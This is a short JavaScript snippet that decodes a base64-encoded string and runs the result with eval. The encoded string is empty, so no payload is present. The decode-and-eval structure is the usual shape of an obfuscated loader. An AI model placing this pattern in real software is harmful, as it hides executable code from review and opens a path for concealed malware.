const base64EncodedScript = "";
const decodedScript = Buffer.from(base64EncodedScript, 'base64').toString('utf-8');

eval(decodedScript);
